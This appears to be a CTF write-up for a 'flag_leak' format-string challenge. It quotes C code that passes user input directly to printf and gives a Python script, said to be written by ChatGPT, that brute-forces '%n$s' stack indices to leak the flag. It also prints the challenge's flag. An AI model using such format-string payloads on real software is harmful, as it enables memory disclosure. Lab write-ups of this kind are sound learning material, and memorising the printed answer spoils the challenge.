# flag_leak challenge

## Flag
CTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}



from the analysis of the source and experience/knowledge while working on buffer_overflow_0,
```
printf("Tell me a story and then I'll tell you one >> ");
scanf("%127s", story);
printf("Here's a story - \n");
printf(story);
printf("\n");
```
no format specifier used in `printf(story)` 
using this exploit it is possible to dump the contents of the stack and ultimately the memory address of our flag on the heap stored as a local variable after the readflag(flag, FLAGSIZE) function is called

a brute force method was to view the contents of every index at stack, i tried doing it manually, was too much so asked chatGPT to write a script 

```
import subprocess

def find_flag(program_path):
    for n in range(1, 500):  # Adjust range as needed
        payload = f"%{n}$s"
        try:
            # Run the program with the payload as input
            process = subprocess.Popen(
                [program_path],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate(input=payload)

            # Check if the output contains the flag
            if "picoCTF" in stdout:
                print(f"Flag found: {stdout.strip()}")
                break
        except Exception as e:
            print(f"Error on index {n}: {e}")
            continue
    else:
        print("Flag not found within the specified range.")

# Path to your program
program_path = "./vuln"  # Replace with the actual program path

find_flag(program_path)
```

and found it at index 24! 
